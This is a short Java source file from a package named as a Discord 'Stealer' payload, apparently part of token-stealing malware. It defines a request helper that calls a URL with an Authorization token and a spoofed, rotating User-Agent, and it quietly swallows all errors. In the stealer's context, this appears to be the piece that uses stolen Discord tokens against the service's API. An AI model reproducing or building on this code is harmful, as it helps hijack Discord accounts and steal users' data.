package Kewl.Stealer.payload.payloads.discord;

import okhttp3.OkHttpClient;
import okhttp3.Response;

public class Request {
    public String get(String url, String token) {
        try {
            OkHttpClient client = new OkHttpClient();
            okhttp3.Request req;
            if (token == null) {
                req = (new okhttp3.Request.Builder()).url(url).build();
            } else {
                req = (new okhttp3.Request.Builder()).url(url).header("User-Agent", Helper.getUserAgents().getAgent()).header("Authorization", token).build();
            }

            Response res = client.newCall(req).execute();
            String resp = res.body().string();
            res.close();
            return resp;
        } catch (Exception var7) {
            return null;
        }
    }
}
